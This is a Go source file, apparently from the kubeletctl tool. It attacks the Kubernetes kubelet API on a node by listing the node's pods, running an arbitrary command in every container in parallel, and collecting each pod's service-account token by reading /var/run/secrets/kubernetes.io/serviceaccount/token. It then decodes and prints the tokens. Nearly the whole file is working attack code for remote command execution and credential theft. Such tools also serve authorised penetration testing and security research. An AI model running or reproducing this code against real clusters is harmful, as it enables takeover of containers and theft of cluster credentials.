package utils

// TODO: consider move this file to be under api package.
// It will cause import cycling because of some of the constants use. Maybe it will be better to move the
// constant.go to to the pgk folder.

import (
	"fmt"
	"io/ioutil"
	"kubeletctl/cmd"
	"kubeletctl/pkg/api"
	"net/http"
	"os"
	"strings"
)

func GetPodsForRunCommand(nodeIPAddress string) []RunPodInfo {
	pods, err := GetPodListFromNodeIP(nodeIPAddress)
	if err != nil {
		fmt.Println("[*] Failed to get pods from Node and run command, exiting")
		os.Exit(1)
	}

	var urls []RunPodInfo
	for _, pod := range pods.Items {
		for _, container := range pod.Spec.Containers {
			apiPathUrl := fmt.Sprintf("%s://%s:%s%s/%s/%s/%s", cmd.ProtocolScheme, nodeIPAddress, cmd.PortFlag, api.RUN, pod.Namespace, pod.Name, container.Name)

			urls = append(urls, RunPodInfo{
				Url:           apiPathUrl,
				PodName:       pod.Name,
				ContainerName: container.Name,
				Namespace:     pod.Namespace,
			})
		}
	}

	return urls
}

func RunCommandOnAllPodsInANode(nodeIPAddress string, command string) {
	urls := GetPodsForRunCommand(nodeIPAddress)
	runParallelCommandsOnPods(urls, CONCURRENCY_DEFAULT_LIMIT, command)
}

type RunPodInfo struct {
	Url           string
	PodName       string
	ContainerName string
	Namespace     string
}

type RunOutput struct {
	StatusCode int
	PodInfo    RunPodInfo
	Err        error
	Output     string
}

func runParallelCommandsOnPods(runPodsInfo []RunPodInfo, concurrencyLimit int, command string) []string {
	// make a slice to hold the results we're expecting
	var vulnerableNodes []string

	// this buffered channel will block at the concurrency limit
	semaphoreChan := make(chan struct{}, concurrencyLimit)

	// this channel will not block and collect the http request results
	resultsChan := make(chan *RunOutput)

	// make sure we close these channels when we're done with them
	defer func() {
		close(semaphoreChan)
		close(resultsChan)
	}()

	// keen an index and loop through every Url we will send a request to
	for i, podInfo := range runPodsInfo {

		// start a go routine with the index and Url in a closure
		go func(i int, podInfo RunPodInfo) {

			// this sends an empty struct into the semaphoreChan which
			// is basically saying add one to the limit, but when the
			// limit has been reached block until there is room
			semaphoreChan <- struct{}{}

			statusCode := 0
			output := ""
			podInfoUrlAndCommand := podInfo.Url + command
			resp, err := api.PostRequest(api.GlobalClient, podInfoUrlAndCommand, []byte{})

			if err == nil && resp != nil {
				statusCode = resp.StatusCode

				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					output = string(bodyBytes)
				}

			}

			result := &RunOutput{statusCode, podInfo, err, output}

			// now we can send the Result struct through the resultsChan
			resultsChan <- result
			// once we're done it's we read from the semaphoreChan which
			// has the effect of removing one from the limit and allowing
			// another goroutine to start
			<-semaphoreChan

		}(i, podInfo)
	}

	// start listening for any results over the resultsChan
	// once we get a Result append it to the Result slice
	podNumber := 1
	spacesString := "   "
	for {
		result := <-resultsChan

		// If we have more than 1 digit, we need to add more spaces to straight the lines
		if podNumber > 9 {
			spacesString = "    "
		} else if podNumber > 99 {
			spacesString = "     "
		}

		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodInfo.PodName))
		sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.PodInfo.Namespace))
		sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.PodInfo.ContainerName))
		sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.PodInfo.Url))
		sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
		fmt.Println(sb.String())

		// if we've reached the expected amount of runPodsInfo then stop
		if podNumber == len(runPodsInfo) {
			break
		}

		podNumber += 1
	}

	// now we're done we return the results
	return vulnerableNodes
}

func GetTokensFromAllPods(nodeIPAddress string) {
	urls := GetPodsForRunCommand(nodeIPAddress)
	getAndPrintTokens(urls, CONCURRENCY_DEFAULT_LIMIT)
}

// TODO: this function should refactor, it similar to the run command parallel with the only change of getting token.
// Check if possible to move the result channel out to a new function.
func getAndPrintTokens(runPodsInfo []RunPodInfo, concurrencyLimit int) {
	command := "?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"

	// this buffered channel will block at the concurrency limit
	semaphoreChan := make(chan struct{}, concurrencyLimit)

	// this channel will not block and collect the http request results
	resultsChan := make(chan *RunOutput)

	// make sure we close these channels when we're done with them
	defer func() {
		close(semaphoreChan)
		close(resultsChan)
	}()

	// keen an index and loop through every Url we will send a request to
	for i, podInfo := range runPodsInfo {

		// start a go routine with the index and Url in a closure
		go func(i int, podInfo RunPodInfo) {

			// this sends an empty struct into the semaphoreChan which
			// is basically saying add one to the limit, but when the
			// limit has been reached block until there is room
			semaphoreChan <- struct{}{}

			statusCode := 0
			output := ""
			podInfoUrlAndCommand := podInfo.Url + command
			resp, err := api.PostRequest(api.GlobalClient, podInfoUrlAndCommand, []byte{})

			if err == nil && resp != nil {
				statusCode = resp.StatusCode

				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					output = string(bodyBytes)
				}

			}

			result := &RunOutput{statusCode, podInfo, err, output}

			// now we can send the Result struct through the resultsChan
			resultsChan <- result
			// once we're done it's we read from the semaphoreChan which
			// has the effect of removing one from the limit and allowing
			// another goroutine to start
			<-semaphoreChan

		}(i, podInfo)
	}

	// start listening for any results over the resultsChan
	// once we get a Result append it to the Result slice
	var count int
	podNumber := 1
	spacesString := "   "
	for {
		result := <-resultsChan

		count += 1

		// If we have more than 1 digit, we need to add more spaces to straight the lines
		if count > 9 {
			spacesString = "    "
		} else if count > 99 {
			spacesString = "     "
		}

		if result.StatusCode == http.StatusOK {
			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodInfo.PodName))
			sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.PodInfo.Namespace))
			sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.PodInfo.ContainerName))
			sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.PodInfo.Url))
			sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
			fmt.Println(sb.String())

			PrintDecodedToken(result.Output)
			podNumber += 1
		}

		// if we've reached the expected amount of runPodsInfo then stop
		if count == len(runPodsInfo) {
			break
		}
	}
}
